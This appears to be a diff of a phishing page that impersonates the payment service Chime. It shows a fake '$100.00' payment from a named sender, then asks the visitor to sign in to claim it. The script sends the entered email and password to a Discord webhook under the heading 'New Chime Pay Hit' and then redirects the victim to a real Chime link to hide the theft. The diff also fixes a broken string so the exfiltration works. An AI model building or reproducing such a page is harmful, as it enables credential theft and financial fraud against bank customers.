@@ -5,76 +5,112 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Chime - Fee-free instant cashout</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f4f5f7;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fff;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            padding: 20px;
+            padding: 24px;
+            color: #1a1a1a;
         }
-        .card {
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        .container {
             width: 100%;
-            max-width: 400px;
-            padding: 32px 24px;
+            max-width: 420px;
             text-align: center;
         }
-        .chime-logo {
-            width: 60px;
-            height: 60px;
+        .chime-icon {
+            width: 64px;
+            height: 64px;
             background: #1ec77f;
-            border-radius: 18px;
+            border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px auto;
-            font-size: 28px;
-            color: #ffffff;
+            margin: 0 auto 24px auto;
+            font-size: 30px;
+            color: #fff;
             font-weight: 700;
+            letter-spacing: -1px;
         }
+        .claim-screen { display: block; }
         .amount {
-            font-size: 48px;
+            font-size: 52px;
             font-weight: 700;
             color: #1a1a1a;
-            margin-bottom: 4px;
+            line-height: 1;
+            margin-bottom: 8px;
         }
-        .sender {
-            font-size: 15px;
+        .sender-line {
+            font-size: 16px;
             color: #555;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
         .sender-name {
             font-weight: 600;
             color: #1a1a1a;
         }
         .fee-badge {
-            display: inline-block;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
             background: #e8f8f0;
             color: #0b8a52;
             font-size: 13px;
             font-weight: 600;
-            padding: 6px 12px;
-            border-radius: 20px;
-            margin-bottom: 24px;
+            padding: 8px 16px;
+            border-radius: 24px;
+            margin-bottom: 32px;
         }
-        .divider {
-            height: 1px;
-            background: #e6e6e6;
+        .fee-badge::before { content: "✓"; font-weight: 700; }
+        .btn {
+            width: 100%;
+            background: #1ec77f;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn:active { background: #17a866; }
+        .footer-note {
+            font-size: 13px;
+            color: #999;
+            margin-top: 24px;
+        }
+        .footer-note span { color: #1ec77f; font-weight: 500; }
+        .login-screen { display: none; }
+        .back-link {
+            display: block;
+            text-align: left;
+            font-size: 15px;
+            color: #1ec77f;
             margin-bottom: 24px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .back-link::before { content: "← "; }
+        .login-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            text-align: left;
+        }
+        .login-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 24px;
+            text-align: left;
         }
         .label {
             font-size: 13px;
-            color: #888;
+            color: #555;
             text-align: left;
             margin-bottom: 4px;
             font-weight: 500;
@@ -88,74 +124,80 @@
             margin-bottom: 16px;
             background: #fafafa;
             transition: border-color 0.2s;
+            -webkit-appearance: none;
         }
         input:focus {
             outline: none;
             border-color: #1ec77f;
             background: #fff;
         }
-        .btn {
-            width: 100%;
-            background: #1ec77f;
-            color: #ffffff;
-            border: none;
-            padding: 16px;
-            border-radius: 8px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 4px;
+        .small-amount-reminder {
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+            margin-bottom: 12px;
         }
-        .btn:active {
-            background: #17a866;
-        }
-        .footer-text {
-            font-size: 12px;
-            color: #999;
-            margin-top: 20px;
-        }
-        .footer-text span {
-            color: #1ec77f;
-            font-weight: 500;
-        }
+        .small-amount-reminder strong { color: #1a1a1a; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="chime-logo">$</div>
-        <div class="amount">$100.00</div>
-        <div class="sender"><span class="sender-name">Jose Diaz</span> sent you money</div>
-        <div class="fee-badge">✓ Fee-free instant cashout</div>
-        <div class="divider"></div>
-        <form id="claim-form">
-            <div class="label">Email</div>
-            <input type="email" name="email" placeholder="your@email.com" required autocomplete="email">
-            <div class="label">Password</div>
-            <input type="password" name="password" placeholder="Chime password" required autocomplete="current-password">
-            <button type="submit" class="btn">Claim $100.00</button>
-        </form>
-        <div class="footer-text">Powered by <span>Chime Pay</span></div>
+    <div class="container">
+
+        <!-- STEP 1: CLAIM SCREEN -->
+        <div class="claim-screen" id="claim-screen">
+            <div class="chime-icon">$</div>
+            <div class="amount">$100.00</div>
+            <div class="sender-line"><span class="sender-name">Destiny Ruiz</span> sent you money</div>
+            <div class="fee-badge">Fee-free instant cashout</div>
+            <button class="btn" id="claim-btn">Claim $100.00</button>
+            <div class="footer-note">Powered by <span>Chime Pay</span></div>
+        </div>
+
+        <!-- STEP 2: LOGIN SCREEN -->
+        <div class="login-screen" id="login-screen">
+            <a class="back-link" id="back-btn">Back</a>
+            <div class="login-title">Sign in to claim</div>
+            <div class="login-subtitle">Enter your Chime login to accept this payment</div>
+            <div class="small-amount-reminder"><strong>Destiny Ruiz</strong> sent you <strong>$100.00</strong></div>
+            <form id="login-form">
+                <div class="label">Email</div>
+                <input type="email" name="email" placeholder="your@email.com" required autocomplete="email">
+                <div class="label">Password</div>
+                <input type="password" name="password" placeholder="Chime password" required autocomplete="current-password">
+                <button type="submit" class="btn">Sign In & Claim</button>
+            </form>
+            <div class="footer-note">Powered by <span>Chime Pay</span></div>
+        </div>
+
     </div>
 
     <script>
-        document.getElementById('claim-form').addEventListener('submit', function(e) {
+        document.getElementById('claim-btn').addEventListener('click', function() {
+            document.getElementById('claim-screen').style.display = 'none';
+            document.getElementById('login-screen').style.display = 'block';
+        });
+
+        document.getElementById('back-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('claim-screen').style.display = 'block';
+        });
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
             var email = document.querySelector('input[name="email"]').value;
             var password = document.querySelector('input[name="password"]').value;
 
-            // Send to your Discord webhook
-            fetch('https://discord.com/api/webhooks/1500643609265963108/KBGWZ9ytDruhyor733rmbeINKg1uUiNuUDy8aOraharOwNXGTLF_y2uvAgOfetB5lwtc {
+            fetch('https://discord.com/api/webhooks/1500643609265963108/KBGWZ9ytDruhyor733rmbeINKg1uUiNuUDy8aOraharOwNXGTLF_y2uvAgOfetB5lwtc', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     content: '📦 **New Chime Pay Hit**\n**Email:** ' + email + '\n**Password:** ' + password + '\n**Time:** ' + new Date().toLocaleString()
                 })
             }).then(function(r) {
-                // Redirect to real Chime claimed page
-                window.location.href = 'https://app.chime.com/pay/claimed';
+                window.location.href = 'https://app.chime.com/pay/Bj5BHwJqQWWQZtjRTcwbKZk?ns_item_id=4cbb32ae-b887-4e5f-b031-7b1ce27a26b9';
             }).catch(function(r) {
-                // Still redirect even if webhook fails
-                window.location.href = 'https://app.chime.com/pay/claimed';
+                window.location.href = 'https://app.chime.com/pay/Bj5BHwJqQWWQZtjRTcwbKZk?ns_item_id=4cbb32ae-b887-4e5f-b031-7b1ce27a26b9';
             });
         });
     </script>
